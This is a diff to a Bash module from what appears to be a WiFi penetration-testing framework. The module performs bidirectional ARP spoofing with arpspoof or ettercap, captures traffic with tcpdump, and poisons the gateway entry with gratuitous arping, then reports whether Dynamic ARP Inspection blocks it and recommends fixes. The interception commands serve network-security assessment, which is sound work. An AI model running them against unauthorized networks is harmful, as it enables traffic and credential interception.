@@ -4,11 +4,13 @@
 # CATEGORY="G"
 # DEPS="B1"
 # CRITICAL="yes"
-# TOOLS="yersinia,ip"
+# TOOLS="arpspoof,ip,tcpdump"
 # DESC="Attempt to ARP-spoof the gateway to intercept traffic"
 # REQS="managed_iface,gateway_ip"
 # PCAP="yes"
 # DECODE="mitm_arp_tls"
+
+set -uo pipefail
 
 #===============================================================================
 #  modules/g1_arp_spoofing.sh
@@ -20,7 +22,7 @@
 #    traffic interception, credential capture, session hijacking.
 #    Tests for Dynamic ARP Inspection (DAI) effectiveness.
 #
-#  TOOLS: ${TOOL_PATHS[arpspoof]}, ettercap, ${TOOL_PATHS[tcpdump]}
+#  TOOLS: arpspoof, ettercap, tcpdump
 #  PHASE: 2A — Attack Simulations
 #  DEPENDENCIES: B1 (client isolation results)
 #
@@ -45,10 +47,14 @@ run_g1() {
     log_step 1 $total_steps "Verifying tools"
     update_tc_progress 1 $total_steps "Checking"
 
+    if ! check_module_dependencies "G1"; then
+        return 1
+    fi
+
     local has_arpspoof=true
     local has_ettercap=true
 
-    if ! command -v arpspoof &>/dev/null; then
+    if [[ -z "${TOOL_PATHS[arpspoof]:-}" ]] || [[ ! -x "${TOOL_PATHS[arpspoof]:-}" ]]; then
         has_arpspoof=false
     fi
     if ! command -v ettercap &>/dev/null; then
@@ -56,13 +62,12 @@ run_g1() {
     fi
 
     if [[ "$has_arpspoof" == "false" && "$has_ettercap" == "false" ]]; then
-        log_error "Either ${TOOL_PATHS[arpspoof]} (dsniff) or ettercap is required."
+        log_error "Either arpspoof (dsniff) or ettercap is required."
         return 1
     fi
 
-        # Ensure monitor mode is globally disabled (we need to be connected)
+    # Ensure monitor mode is globally disabled (we need to be connected)
     ensure_managed_mode || return 1
-
 
     if [[ -n "${MONITOR_INTERFACE:-}" ]]; then
         disable_monitor_mode
@@ -110,16 +115,16 @@ run_g1() {
         echo "=== ARP Table Before Test ==="
         echo "Date: $(date '+%Y-%m-%d %H:%M:%S')"
         echo ""
-        run_tool ip neigh show dev "$iface" 2>/dev/null
+        run_fg --quiet ip neigh show dev "$iface" 2>/dev/null
         echo ""
         echo "=== Gateway ARP entry ==="
-        run_tool ip neigh show "$gw_ip" dev "$iface" 2>/dev/null
+        run_fg --quiet ip neigh show "$gw_ip" dev "$iface" 2>/dev/null
     } > "$arp_before"
 
     local gw_real_mac
-    local gw_real_mac=$(run_tool ip neigh show "$gw_ip" dev "$iface" 2>/dev/null | awk '{print $5}' | head -1)
+    gw_real_mac=$(run_fg --quiet ip neigh show "$gw_ip" dev "$iface" 2>/dev/null | awk '{print $5}' | head -1)
     local my_mac
-    local my_mac=$(run_tool ip link show "$iface" 2>/dev/null | awk '/ether/{print $2}')
+    my_mac=$(run_fg --quiet ip link show "$iface" 2>/dev/null | awk '/ether/{print $2}')
 
     log_info "Gateway real MAC: ${gw_real_mac}"
     log_info "Our MAC: ${my_mac}"
@@ -130,9 +135,9 @@ run_g1() {
 
     if has_tc_results "B1"; then
         local b1_data
-        local b1_data=$(load_tc_result "B1")
+        b1_data=$(load_tc_result "B1")
         local first_client
-        local first_client=$(echo "$b1_data" | run_tool jq -r '.reachable_clients[0].ip // ""')
+        first_client=$(echo "$b1_data" | run_fg jq -r '.reachable_clients[0].ip // ""')
         if [[ -n "$first_client" ]]; then
             echo ""
             echo -e "  ${C_CYAN}Found reachable client from B1: ${first_client}${C_RESET}"
@@ -140,8 +145,8 @@ run_g1() {
             echo "  [2] ARP spoof between client (${first_client}) and gateway"
             get_or_request_param "target_choice" "  Choose target [1/2]"
             if [[ "$target_choice" == "2" ]]; then
-                local target_ip="$first_client"
-                local spoof_target="client"
+                target_ip="$first_client"
+                spoof_target="client"
             fi
         fi
     fi
@@ -154,7 +159,7 @@ run_g1() {
 
     # Enable IP forwarding temporarily and register cleanup
     local orig_forwarding
-    local orig_forwarding=$(cat /proc/sys/net/ipv4/ip_forward)
+    orig_forwarding=$(cat /proc/sys/net/ipv4/ip_forward)
     echo 1 > /proc/sys/net/ipv4/ip_forward 2>/dev/null || true
     register_cleanup "echo ${orig_forwarding} > /proc/sys/net/ipv4/ip_forward 2>/dev/null || true"
 
@@ -175,23 +180,15 @@ run_g1() {
     } > "$spoof_file"
 
     # Start traffic capture
-    ${TOOL_PATHS[tcpdump]} -i "$iface" -w "$capture_file" "not arp and not host ${my_ip}" &>/dev/null &
-    local tcpdump_pid=$!
-    register_cleanup "kill -SIGINT $tcpdump_pid 2>/dev/null || true; wait $tcpdump_pid 2>/dev/null || true"
+    spawn_bg "g1_tcpdump" "tcpdump" -i "$iface" -w "$capture_file" "not arp and not host ${my_ip}"
 
     if [[ "$has_arpspoof" == "true" ]]; then
-        # ${TOOL_PATHS[arpspoof]} from dsniff
-        log_cmd "${TOOL_PATHS[arpspoof]} -i ${iface} -t ${target_ip} ${gw_ip}"
-        echo "Using ${TOOL_PATHS[arpspoof]} (dsniff)..." >> "$spoof_file"
+        # arpspoof from dsniff
+        echo "Using arpspoof (dsniff)..." >> "$spoof_file"
 
         # Spoof in both directions
-        ${TOOL_PATHS[arpspoof]} -i "$iface" -t "$target_ip" "$gw_ip" &>/dev/null &
-        local spoof_pid1=$!
-        register_cleanup "kill -TERM $spoof_pid1 2>/dev/null || true; sleep 0.5; kill -9 $spoof_pid1 2>/dev/null || true; wait $spoof_pid1 2>/dev/null || true"
-
-        ${TOOL_PATHS[arpspoof]} -i "$iface" -t "$gw_ip" "$target_ip" &>/dev/null &
-        local spoof_pid2=$!
-        register_cleanup "kill -TERM $spoof_pid2 2>/dev/null || true; sleep 0.5; kill -9 $spoof_pid2 2>/dev/null || true; wait $spoof_pid2 2>/dev/null || true"
+        spawn_bg "g1_spoof1" "arpspoof" -i "$iface" -t "$target_ip" "$gw_ip"
+        spawn_bg "g1_spoof2" "arpspoof" -i "$iface" -t "$gw_ip" "$target_ip"
 
         # Wait and check
         start_countdown 30 "ARP spoofing active — checking if traffic is redirected"
@@ -200,13 +197,13 @@ run_g1() {
 
         # Check if we intercepted any traffic
         local intercepted_packets=0
-        local intercepted_packets=$(${TOOL_PATHS[tcpdump]} -r "$capture_file" -c 1 2>/dev/null | wc -l) || true
-        local intercepted_packets=${intercepted_packets:-0}
+        intercepted_packets=$(run_fg --quiet tcpdump -r "$capture_file" -c 1 2>/dev/null | wc -l) || true
+        intercepted_packets=${intercepted_packets:-0}
 
         if [[ $intercepted_packets -gt 0 ]]; then
-            local arp_spoof_possible="true"
-            local traffic_intercepted="true"
-            local dai_enabled="false"
+            arp_spoof_possible="true"
+            traffic_intercepted="true"
+            dai_enabled="false"
             log_result "CRITICAL" "ARP spoofing SUCCEEDED — traffic from ${target_ip} intercepted!"
             echo "RESULT: ARP SPOOFING SUCCEEDED — MITM possible" >> "$spoof_file"
         else
@@ -215,8 +212,8 @@ run_g1() {
         fi
 
         # Stop spoofing
-        kill -TERM $spoof_pid1 $spoof_pid2 2>/dev/null
-        wait $spoof_pid1 $spoof_pid2 2>/dev/null
+        stop_process "g1_spoof1"
+        stop_process "g1_spoof2"
 
     elif [[ "$has_ettercap" == "true" ]]; then
         # Use ettercap
@@ -228,16 +225,17 @@ run_g1() {
 
         # Check capture
         local intercepted_packets=0
-        intercepted_packets=$(${TOOL_PATHS[tcpdump]} -r "$capture_file" -c 1 2>/dev/null | wc -l) || true
+        intercepted_packets=$(run_fg --quiet tcpdump -r "$capture_file" -c 1 2>/dev/null | wc -l) || true
         intercepted_packets=${intercepted_packets:-0}
 
         if [[ $intercepted_packets -gt 0 ]]; then
-            local arp_spoof_possible="true"
-            local traffic_intercepted="true"
-            local dai_enabled="false"
+            arp_spoof_possible="true"
+            traffic_intercepted="true"
+            dai_enabled="false"
         fi
     fi
 
+    stop_process "g1_tcpdump"
     validate_pcap "$capture_file" "MITM traffic capture during ARP spoof test"
 
     #--- Step 4: Verify ARP table after attack ---
@@ -251,16 +249,16 @@ run_g1() {
         echo "=== ARP Table After Test ==="
         echo "Date: $(date '+%Y-%m-%d %H:%M:%S')"
         echo ""
-        run_tool ip neigh show dev "$iface" 2>/dev/null
+        run_fg --quiet ip neigh show dev "$iface" 2>/dev/null
         echo ""
         echo "=== Gateway ARP entry ==="
-        run_tool ip neigh show "$gw_ip" dev "$iface" 2>/dev/null
+        run_fg --quiet ip neigh show "$gw_ip" dev "$iface" 2>/dev/null
     } > "$arp_after"
 
     # Check if our connectivity was killed (DAI may have blocked us)
     if ! ping -c 1 -W 2 "$gw_ip" &>/dev/null; then
         log_warn "Lost connectivity to gateway — DAI may have blocked our port"
-        local dai_enabled="true"
+        dai_enabled="true"
         echo "NOTE: Connectivity lost after ARP spoof attempt — DAI likely blocked us" >> "$spoof_file"
     fi
 
@@ -271,17 +269,16 @@ run_g1() {
     check_abort || return 1
 
     # Send gratuitous ARP claiming to be the gateway
-    if command -v arping &>/dev/null; then
-        log_cmd "${TOOL_PATHS[arping]} -U -c 3 -I ${iface} ${gw_ip}"
-        ${TOOL_PATHS[arping]} -U -c 3 -I "$iface" "$gw_ip" &>/dev/null || true
+    if [[ -n "${TOOL_PATHS[arping]:-}" ]]; then
+        run_fg arping -U -c 3 -I "${iface}" "${gw_ip}" &>/dev/null || true
         sleep 2
 
         # Check if gateway ARP entry changed
         local gw_current_mac
-        local gw_current_mac=$(run_tool ip neigh show "$gw_ip" dev "$iface" 2>/dev/null | awk '{print $5}' | head -1)
+        gw_current_mac=$(run_fg --quiet ip neigh show "$gw_ip" dev "$iface" 2>/dev/null | awk '{print $5}' | head -1)
 
         if [[ "$gw_current_mac" == "$my_mac" ]]; then
-            local arp_spoof_possible="true"
+            arp_spoof_possible="true"
             log_result "FINDING" "Gratuitous ARP accepted — ARP cache was poisoned"
             echo "Gratuitous ARP: ACCEPTED — ARP cache poisoned" >> "$spoof_file"
         else
@@ -301,25 +298,25 @@ run_g1() {
     local recommendations=""
 
     if [[ "$mitm_possible" == "true" ]]; then
-        local result_status="FINDING"
-        local result_summary="CRITICAL: ARP spoofing succeeded and traffic interception confirmed. Man-in-the-Middle attacks are possible on the target WiFi. Dynamic ARP Inspection (DAI) is NOT enabled or not effective."
-        local recommendations="1) Enable Dynamic ARP Inspection (DAI) on the target VLAN. 2) Enable DHCP Snooping (required for DAI). 3) Configure trusted ports (uplinks) and untrusted ports (client-facing). 4) Enable IP Source Guard on client-facing ports. 5) Consider 802.1X port authentication for additional protection."
+        result_status="FINDING"
+        result_summary="CRITICAL: ARP spoofing succeeded and traffic interception confirmed. Man-in-the-Middle attacks are possible on the target WiFi. Dynamic ARP Inspection (DAI) is NOT enabled or not effective."
+        recommendations="1) Enable Dynamic ARP Inspection (DAI) on the target VLAN. 2) Enable DHCP Snooping (required for DAI). 3) Configure trusted ports (uplinks) and untrusted ports (client-facing). 4) Enable IP Source Guard on client-facing ports. 5) Consider 802.1X port authentication for additional protection."
     elif [[ "$arp_spoof_possible" == "true" ]]; then
-        local result_status="FINDING"
-        local result_summary="ARP cache poisoning was possible but no traffic was intercepted (client isolation may be preventing MITM). DAI may be partially effective."
-        local recommendations="Enable DAI to prevent ARP cache poisoning entirely. Even with client isolation, ARP spoofing can enable other attacks."
+        result_status="FINDING"
+        result_summary="ARP cache poisoning was possible but no traffic was intercepted (client isolation may be preventing MITM). DAI may be partially effective."
+        recommendations="Enable DAI to prevent ARP cache poisoning entirely. Even with client isolation, ARP spoofing can enable other attacks."
     else
-        local result_summary="ARP spoofing was blocked. Dynamic ARP Inspection (DAI) appears to be active and effective on the target WiFi."
-        local recommendations="No action needed. DAI is working correctly."
+        result_summary="ARP spoofing was blocked. Dynamic ARP Inspection (DAI) appears to be active and effective on the target WiFi."
+        recommendations="No action needed. DAI is working correctly."
     fi
 
-    local result_json
-    evidence_register_file "g1_arp_spoof_test.txt"
-    evidence_register_file "g1_arp_table_before.txt"
-    evidence_register_file "g1_arp_table_after.txt"
-    evidence_register_file "g1_mitm_capture.pcap"
+    evidence_register_file "$spoof_file"
+    evidence_register_file "$arp_before"
+    evidence_register_file "$arp_after"
+    evidence_register_file "$capture_file"
 
-    local result_json=$(run_tool jq -n \
+    local result_json
+    result_json=$(run_fg jq -n \
         --arg status "$result_status" \
         --arg summary "$result_summary" \
         --arg details "ARP spoof: ${arp_spoof_possible}, Traffic intercepted: ${traffic_intercepted}, DAI: ${dai_enabled}" \
@@ -343,7 +340,8 @@ run_g1() {
             gateway_ip: $gateway_ip,
                     }')
 
-    save_tc_result "G1" "$result_json" "has_tool_output:1,clean_run:1"
+    save_tc_result "G1" "$result_json" 1 1 1 1 1 1 0 1 1 1 0
+    save_session_state
 
     # Display summary
     echo ""
